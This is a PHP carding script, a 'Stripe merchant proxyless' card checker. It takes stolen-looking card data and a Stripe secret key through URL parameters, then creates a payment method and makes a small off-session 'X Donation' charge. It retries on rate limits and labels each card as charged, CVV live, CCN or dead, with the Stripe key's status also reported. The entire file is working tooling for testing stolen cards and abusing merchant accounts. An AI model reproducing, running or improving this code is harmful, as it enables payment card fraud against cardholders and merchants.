<?php


//===================== [ MADE BY - 𝐓𝐡𝐞 3𝐧𝐃𝐋𝐞𝐁 ‘ ] ====================//
#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$idd = $_GET['idd'];
$amt = $_GET['cst'];
if(empty($amt)) {
	$amt = '0.5';
	$chr = $amt * 100;
}
$chr = $amt * 100;
if(isset($_GET['sec'])){

    $get_sk = $_GET['sec'];

}
$sk= trim($get_sk);
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";





//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#  
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');  
$result1 = curl_exec($ch);  
$tok1 = Getstr($result1,'"id": "','"');  
$msg = Getstr($result1,'"message": "','"');  
//echo "<br><b>Result1: </b> $result1<br>";  
if (strpos($result1, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}  
  
  
#------------------[2nd REQ]--------------------#  
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=X Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
$result2 = curl_exec($ch);  
$tok2 = Getstr($result2,'"id": "','"');  
$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
//echo "<br><b>Result2: </b> $result2<br>";  
$country = trim(strip_tags(getStr($result1, '"country": "', '"')));
if (strpos($result2, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}




//=================== [ RESPONSES ] ===================//

if(strpos($result2, '"seller_message": "Payment complete."' )) {
    echo 'CHARGED</span>  </span>𝘾𝘾:  '.$lista.' </span>  <br>➤ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: $'.$amt.' 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝗖𝗖𝗡 ✅ </a> <br> ➤ 𝗥𝗘𝗖𝗘𝗜𝗣𝗧 : <a href='.$receipturl.'>𝗛𝗘𝗥𝗘</a><br> ➤ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 : '.$country.'<br>➤ 𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.' <br> <br>';
}
elseif(strpos($result2,'"cvc_check": "pass"')){
    echo 'CVV</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: CVV LIVE <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}


elseif(strpos($result1, "generic_decline")) {
    echo 'DEAD</span>  </span>𝘾𝘾: '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: GENERIC DECLINED <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
    }
elseif(strpos($result2, "generic_decline" )) {
    echo 'DEAD</span>  </span>𝘾𝘾:   '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: GENERIC DECLINED<br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.' </span><br>';
}
elseif(strpos($result2, "insufficient_funds" )) {
    echo 'CVV</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: INSUFFICIENT FUNDS <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}

elseif(strpos($result2, "fraudulent" )) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: FRAUDULENT<br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.' </span><br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: DO NOT HONOR <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: DO NOT HONOR <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result,"fraudulent")){
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: FRAUDULENT <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo 'CCN</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: Security code is incorrect <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo 'CCN</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: Security code is incorrect  <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
     
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: INVAILD EXPIRY MONTH <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';

}
elseif(strpos($result2,"invalid_account")){
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: INVAILD ACCOUNT <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: DO NOT HONOR <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: LOST CARD<br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.' </span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: LOST CARD</span></span>  <br>Result: CHECKER BY <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span> <br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: STOLEN CARD <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
    }

elseif(strpos($result2, "stolen_card" )) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: STOLEN CARD <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';


}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo 'CVV</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: TRANSACTION NOT ALLOWED <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
    }
    elseif(strpos($result2, "authentication_required")) {
    	echo 'CVV</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: 32DS REQUIRED <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo 'CVV</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: 32DS REQUIRED  <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo 'CVV</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥E𝗦𝗨𝗟𝗧: 32DS REQUIRED  <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
   } 
   elseif(strpos($result1, "card_error_authentication_required")) {
    	echo 'CVV</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: 32DS REQUIRED <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
   } 
elseif(strpos($result2, "incorrect_cvc" )) {
    echo 'CVV</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: Security code is incorrect <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: PICKUP CARD <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '𝘿??𝘼??</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: PICKUP CARD <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: EXPIRED CARD <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: EXPIRED CARD <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';

}
elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
	echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: SK IS AT RATE LIMIT <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: PROCESSING ERROR <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: YOUR CARD NUMBER IS INCORRECT <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: SERVICE NOT ALLOWED <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: PROCESSING ERROR <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: YOUR CARD NUMBER IS INCORRECT <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: SERVICE NOT ALLOWED <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: INCORRECT CARD NUMBER <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo 'DEAD</span>  </span>𝘾𝘾: '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: INCORRECT CARD NUMBER <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: DO NOT HONOR <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: CARD DECLINED <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo 'DEAD</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: DO NOT HONOR <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo '𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: GENERIC CARD <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: CARD DECLINED <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';

}
elseif(strpos($result2,' "decline_code": "do_not_honor"')){
    echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: DO NOT HONOR <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: CVC_UNCHECKED : INFORM AT OWNER <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: CVC_CHECK : FAIL <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result2, "card_not_supported")) {
	echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: CARD NOT SUPPORTED <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: CVC_CHECK : UNVAILABLE <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: CVC_UNCHECKED : INFORM TO OWNER」 <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: CVC_CHECKED : FAIL <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result2,"currency_not_supported")) {
	echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: CURRENCY NOT SUPORTED TRY IN INR <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '𝘿𝙀𝘼𝘿</span> 𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: CARD NOT SUPPORT THIS TYPE OF PURCHASE <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo 'CVV</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: CVV LIVE  <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result2, "fraudulent" )) {
    echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: FRAUDULENT <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: SK KEY DEAD OR INVALID <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: SK KEY REVOKED <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: ENTER CC TO CHECK<br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.' </span><br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo '𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: CARD NOT SUPPORTED <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
}
else {
    echo '𝘿𝙀𝘼𝘿</span> 𝘾𝘾:  '.$lista.'</span>  <br>➤𝗥𝗘𝗦𝗨𝗟𝗧: GENERIC DECLINE  <br> ➤𝗕𝗬𝗣𝗔𝗦𝗦𝗜𝗡𝗚: '.$x.'</span><br>';
   
   
      
}



//===================== [ MADE BY - 𝐓𝐡𝐞 3𝐧𝐃𝐋𝐞𝐁 ‘ ] ====================//


//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//echo "<b>Reason:</b> $reason<br>";
//echo "<b>Risk Level:</b> $riskl<br>";
//echo "<b>Seller Message:</b> $seller_msg<br>";

//echo "<br><b>Result3: </b> $result2<br>";

curl_close($ch);
ob_flush();
?>